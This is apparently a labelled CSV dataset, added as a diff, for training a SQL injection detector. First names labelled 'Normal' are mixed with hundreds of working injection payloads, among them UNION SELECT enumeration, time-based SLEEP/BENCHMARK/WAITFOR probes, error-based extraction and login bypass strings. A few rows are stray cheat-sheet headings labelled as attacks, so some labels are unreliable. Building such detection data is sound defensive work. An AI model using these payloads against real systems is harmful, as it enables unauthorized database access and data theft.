+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8--'",SQL Injection
+'Grace',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#'",SQL Injection
+'Eve',Normal
+'Hank',Normal
+'Alice',Normal
+'Alice',Normal
+'Hank',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--'",SQL Injection
+'Eve',Normal
+'John',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#'",SQL Injection
+"'admin"""" #'",SQL Injection
+'AS INJECTX WHERE 1=1 AND 1=0#',SQL Injection
+'# Numeric',SQL Injection
+'Grace',Normal
+'Bob',Normal
+'Grace',Normal
+'ORDER BY 11--',SQL Injection
+'Charlie',Normal
+"'or benchmark(50000000,MD5(1))'",SQL Injection
+'OR 1=0--',SQL Injection
+'' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --',SQL Injection
+'WHERE 1=1 AND 1=1#',SQL Injection
+'Fran',Normal
+"'"""" or """"""""-""""'",SQL Injection
+'Fran',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7'",SQL Injection
+'Jill',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13--'",SQL Injection
+'Eve',Normal
+'Alice',Normal
+'Jill',Normal
+'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--'",SQL Injection
+'Hank',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--'",SQL Injection
+'Alice',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#'",SQL Injection
+Microservice running on port 12345,Normal
+'Hank',Normal
+'ORDER BY 2#',SQL Injection
+'John',Normal
+'David',Normal
+'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)',SQL Injection
+'or true--',SQL Injection
+'ORDER BY 26',SQL Injection
+'or SLEEP(5)#',SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'",SQL Injection
+'Grace',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--'",SQL Injection
+'Eve',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#'",SQL Injection
+'Alice',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
+'Charlie',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'Eve',Normal
+'Hank',Normal
+'ORDER BY 3',SQL Injection
+'John',Normal
+'UNION ALL SELECT SLEEP(5)--',SQL Injection
+'Bob',Normal
+'Alice',Normal
+'Charlie',Normal
+'Fran',Normal
+'Charlie',Normal
+'AND 7506=9091 AND ('5913=5913',SQL Injection
+'Grace',Normal
+'Grace',Normal
+'Grace',Normal
+'Fran',Normal
+'John',Normal
+"'admin"""") or """"1""""=""""1""""--'",SQL Injection
+'Bob',Normal
+'Fran',Normal
+'Alice',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))--'",SQL Injection
+'Fran',Normal
+''-'',SQL Injection
+'' OR '1',SQL Injection
+'Fran',Normal
+'Jill',Normal
+"'ORDER BY 1,SLEEP(5),3,4#'",SQL Injection
+'Jill',Normal
+'David',Normal
+'David',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#'",SQL Injection
+'Eve',Normal
+'Jill',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4'",SQL Injection
+'HAVING 1=1--',SQL Injection
+'AND 1=0#',SQL Injection
+'Bob',Normal
+'Hank',Normal
+"'1' ORDER BY 1,2,3--+'",SQL Injection
+'admin') or ('1'='1'/*',SQL Injection
+'Grace',Normal
+'Charlie',Normal
+'Bob',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--'",SQL Injection
+'Charlie',Normal
+'Charlie',Normal
+'Fran',Normal
+'John',Normal
+'Hank',Normal
+'Charlie',Normal
+'Jill',Normal
+'Fran',Normal
+'OR 1=1--',SQL Injection
+'admin' or '1'='1'--',SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30'",SQL Injection
+'Hank',Normal
+'Bob',Normal
+'Eve',Normal
+'Jill',Normal
+Microservice running on port 6000,Normal
+'AND 1',SQL Injection
+'Jill',Normal
+'Hank',Normal
+"'or benchmark(50000000,MD5(1))'",SQL Injection
+'Alice',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))--'",SQL Injection
+'John',Normal
+'Charlie',Normal
+'Fran',Normal
+'Charlie',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'",SQL Injection
+'Eve',Normal
+'David',Normal
+'%2c(select%20*%20from%20(select(sleep(10)))a)',SQL Injection
+'OR x=x',SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#'",SQL Injection
+'David',Normal
+'Bob',Normal
+'David',Normal
+'Fran',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'",SQL Injection
+'ORDER BY SLEEP(5)--',SQL Injection
+'Grace',Normal
+'Grace',Normal
+'Fran',Normal
+'Hank',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17'",SQL Injection
+'Grace',Normal
+'Fran',Normal
+'Eve',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#'",SQL Injection
+'David',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#'",SQL Injection
+'David',Normal
+'Fran',Normal
+'ORDER BY 22#',SQL Injection
+'Grace',Normal
+'Hank',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#'",SQL Injection
+'Grace',Normal
+'ORDER BY 6#',SQL Injection
+'Alice',Normal
+'Bob',Normal
+'David',Normal
+'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--',SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))--'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))'",SQL Injection
+'Jill',Normal
+'Charlie',Normal
+'Charlie',Normal
+'ORDER BY 14#',SQL Injection
+'David',Normal
+'ORDER BY 4#',SQL Injection
+'AND 1=1--',SQL Injection
+'Charlie',Normal
+'John',Normal
+'Jill',Normal
+'Eve',Normal
+'Hank',Normal
+"'"""" or sleep(5)=""""'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'",SQL Injection
+'David',Normal
+'ORDER BY 21--',SQL Injection
+'John',Normal
+'Hank',Normal
+'Eve',Normal
+'ORDER BY 7--',SQL Injection
+'Alice',Normal
+'John',Normal
+'or 1=1#',SQL Injection
+"'OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))'",SQL Injection
+'Jill',Normal
+'Bob',Normal
+'Grace',Normal
+'Grace',Normal
+'Alice',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#'",SQL Injection
+"'' or benchmark(10000000,MD5(1))#'",SQL Injection
+'Grace',Normal
+'John',Normal
+'John',Normal
+'Alice',Normal
+'Fran',Normal
+'AND 1083=1083 AND ('1427=1427',SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#'",SQL Injection
+'Grace',Normal
+'Finding the table name',SQL Injection
+'ORDER BY 4--',SQL Injection
+'David',Normal
+''LIKE'',SQL Injection
+'AnD SLEEP(5)--',SQL Injection
+'Jill',Normal
+'David',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'",SQL Injection
+'Hank',Normal
+"'') or benchmark(10000000,MD5(1))#'",SQL Injection
+'Hank',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7'",SQL Injection
+'Eve',Normal
+'Charlie',Normal
+'Bob',Normal
+"'"""") or sleep(5)=""""'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#'",SQL Injection
+"'"""" or sleep(5)=""""'",SQL Injection
+'ORDER BY 10--',SQL Injection
+'AND 7300=7300 AND ('pKlZ'='pKlZ',SQL Injection
+'Bob',Normal
+'John',Normal
+'Fran',Normal
+'Fran',Normal
+'AnD SLEEP(5)#',SQL Injection
+'Jill',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'",SQL Injection
+'Hank',Normal
+'Grace',Normal
+'John',Normal
+'Charlie',Normal
+'Charlie',Normal
+'Eve',Normal
+'1 or pg_sleep(5)--',SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'",SQL Injection
+'Grace',Normal
+'Grace',Normal
+'Fran',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'",SQL Injection
+'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#',SQL Injection
+'Grace',Normal
+'admin') or ('1'='1'/*',SQL Injection
+'Alice',Normal
+'Fran',Normal
+'ORDER BY SLEEP(5)',SQL Injection
+'David',Normal
+'Eve',Normal
+'ORDER BY 8#',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--'",SQL Injection
+'OR x=x',SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))'",SQL Injection
+'OR 3409=3409 AND ('pytW' LIKE 'pytY',SQL Injection
+'Alice',Normal
+"'and (select substring(@@version,2,1))='y''",SQL Injection
+'OR 1=0--',SQL Injection
+'Grace',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'Fran',Normal
+'Fran',Normal
+'Hank',Normal
+'Eve',Normal
+'John',Normal
+"'"""";",SQL Injection
+'AND true',SQL Injection
+'%' AND 8310=8310 AND '%'='',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'",SQL Injection
+'ORDER BY 2#',SQL Injection
+'Eve',Normal
+'Alice',Normal
+'David',Normal
+'Fran',Normal
+'Alice',Normal
+'Fran',Normal
+'';,SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'",SQL Injection
+'Alice',Normal
+'RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='',SQL Injection
+"'') or benchmark(10000000,MD5(1))#'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),3'",SQL Injection
+'ORDER BY 4',SQL Injection
+'Eve',Normal
+'Jill',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9'",SQL Injection
+'' '',SQL Injection
+'Bob',Normal
+'ORDER BY 30#',SQL Injection
+'Alice',Normal
+'David',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#'",SQL Injection
+'Bob',Normal
+'ORDER BY 16',SQL Injection
+'Eve',Normal
+'David',Normal
+'Bob',Normal
+'1) or sleep(5)#',SQL Injection
+'Charlie',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'",SQL Injection
+'David',Normal
+"'UNION ALL SELECT 1,2,3,4,5'",SQL Injection
+'Eve',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'",SQL Injection
+''''''''''''''UNION SELECT '2',SQL Injection
+'Grace',Normal
+'||		(double pipe) concatenate',SQL Injection
+'John',Normal
+'John',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#'",SQL Injection
+''*'',SQL Injection
+'\',SQL Injection
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL--'",SQL Injection
+'Charlie',Normal
+'Grace',Normal
+'Alice',Normal
+'John',Normal
+'Eve',Normal
+'David',Normal
+'Bob',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#'",SQL Injection
+'Charlie',Normal
+'Fran',Normal
+'Fran',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))'",SQL Injection
+'Alice',Normal
+'David',Normal
+"'"""") or (""""x"""")=(""""x'",SQL Injection
+'ORDER BY 7#',SQL Injection
+'Eve',Normal
+'OR 1=0#',SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14'",SQL Injection
+'admin' or '1'='1'--',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#'",SQL Injection
+'HAVING 1=0--',SQL Injection
+'Bob',Normal
+"'AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--'",SQL Injection
+'Comments:',SQL Injection
+"'"""") or (""""x"""")=(""""x'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#'",SQL Injection
+'Jill',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--'",SQL Injection
+'Charlie',Normal
+'John',Normal
+'Grace',Normal
+'Hank',Normal
+'' UNION SELECT sum(columnname ) from tablename --',SQL Injection
+'ORDER BY 2--',SQL Injection
+'David',Normal
+'Grace',Normal
+'Grace',Normal
+'' AND EXISTS(SELECT * FROM users WHERE name = 'admin') --',SQL Injection
+'David',Normal
+"'admin"""") or (""""1""""=""""1""""#'",SQL Injection
+'John',Normal
+'Hank',Normal
+'Grace',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--'",SQL Injection
+"'AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))'",SQL Injection
+'Hank',Normal
+'Charlie',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'",SQL Injection
+'Hank',Normal
+'Bob',Normal
+'Fran',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--'",SQL Injection
+'Charlie',Normal
+'Jill',Normal
+'Alice',Normal
+'Fran',Normal
+'AS INJECTX WHERE 1=1 AND 1=0#',SQL Injection
+'Hank',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'",SQL Injection
+'Alice',Normal
+"'and (select substring(@@version,2,1))='i''",SQL Injection
+'ORDER BY 22',SQL Injection
+'David',Normal
+''-'',SQL Injection
+'Charlie',Normal
+'Bob',Normal
+'Grace',Normal
+'Grace',Normal
+'' OR 'x'='x',SQL Injection
+'Eve',Normal
+'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#',SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8'",SQL Injection
+'Hank',Normal
+'Bob',Normal
+'Alice',Normal
+'AND 1=1--',SQL Injection
+'Grace',Normal
+'John',Normal
+'Eve',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))'",SQL Injection
+'Eve',Normal
+'Bob',Normal
+'David',Normal
+'Fran',Normal
+'Fran',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),3'",SQL Injection
+'Fran',Normal
+'Fran',Normal
+'Grace',Normal
+'Bob',Normal
+'John',Normal
+'%		wildcard attribute indicator',SQL Injection
+'Jill',Normal
+'Fran',Normal
+'Hank',Normal
+';',SQL Injection
+'Hank',Normal
+'Bob',Normal
+"'1' GROUP BY 1,2,3--+'",SQL Injection
+'Grace',Normal
+'Fran',Normal
+'Bob',Normal
+'Jill',Normal
+'Jill',Normal
+'Eve',Normal
+'Hank',Normal
+'John',Normal
+'David',Normal
+'Eve',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'Alice',Normal
+'Charlie',Normal
+'Bob',Normal
+"'AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'",SQL Injection
+'John',Normal
+'Bob',Normal
+'Fran',Normal
+'Charlie',Normal
+'Fran',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'Alice',Normal
+'Fran',Normal
+'David',Normal
+'' or 'x'='x',SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#'",SQL Injection
+'John',Normal
+'Grace',Normal
+'UNION ALL SELECT NULL#',SQL Injection
+'John',Normal
+'' AND id IS NULL; --',SQL Injection
+'Fran',Normal
+'Grace',Normal
+'Fran',Normal
+'Jill',Normal
+'Hank',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'",SQL Injection
+'Hank',Normal
+'John',Normal
+"'UNION ALL SELECT 1,2,3,4--'",SQL Injection
+'David',Normal
+'Alice',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'",SQL Injection
+'Grace',Normal
+'Fran',Normal
+'Alice',Normal
+'Fran',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30'",SQL Injection
+'UNION ALL SELECT NULL--',SQL Injection
+'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--',SQL Injection
+'Jill',Normal
+'Fran',Normal
+'Jill',Normal
+'||		(double pipe) concatenate',SQL Injection
+'Alice',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2--'",SQL Injection
+'AND 1=1 AND '%'='',SQL Injection
+'John',Normal
+'Grace',Normal
+'ORDER BY 31337--',SQL Injection
+'Grace',Normal
+'Hank',Normal
+'Charlie',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#'",SQL Injection
+'John',Normal
+'John',Normal
+'';WAITFOR DELAY '0:0:30'--',SQL Injection
+'David',Normal
+'UNION ALL SELECT NULL',SQL Injection
+'David',Normal
+'Charlie',Normal
+'John',Normal
+'Bob',Normal
+'Alice',Normal
+'Hank',Normal
+'Eve',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'",SQL Injection
+'Fran',Normal
+'OR 1=0--',SQL Injection
+'Charlie',Normal
+'John',Normal
+'Fran',Normal
+'David',Normal
+"'admin"""" or 1=1/*'",SQL Injection
+'Alice',Normal
+'Charlie',Normal
+'Charlie',Normal
+'RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='',SQL Injection
+'Jill',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))'",SQL Injection
+'Bob',Normal
+'Grace',Normal
+'ORDER BY SLEEP(5)#',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--'",SQL Injection
+'Bob',Normal
+'David',Normal
+'Hank',Normal
+'Alice',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))--'",SQL Injection
+'WHERE 1=1 AND 1=1#',SQL Injection
+"'"""" or """"""""*""""'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--'",SQL Injection
+'Alice',Normal
+'Fran',Normal
+'Hank',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))--'",SQL Injection
+'Alice',Normal
+'Alice',Normal
+'John',Normal
+'Bob',Normal
+'Eve',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#'",SQL Injection
+'David',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))'",SQL Injection
+'Charlie',Normal
+'UNION ALL SELECT 1',SQL Injection
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#'",SQL Injection
+'David',Normal
+'Fran',Normal
+'Charlie',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'",SQL Injection
+'Bob',Normal
+'Jill',Normal
+'OR x=x',SQL Injection
+''));,SQL Injection
+'Fran',Normal
+'John',Normal
+'Eve',Normal
+'Eve',Normal
+'Fran',Normal
+'1 or sleep(5)#',SQL Injection
+'Hank',Normal
+'David',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))'",SQL Injection
+'AS INJECTX WHERE 1=1 AND 1=1--',SQL Injection
+'John',Normal
+'David',Normal
+'John',Normal
+'Grace',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#'",SQL Injection
+'Eve',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#'",SQL Injection
+'Charlie',Normal
+'Jill',Normal
+'Charlie',Normal
+'or SLEEP(5)#',SQL Injection
+'John',Normal
+'ORDER BY 1--',SQL Injection
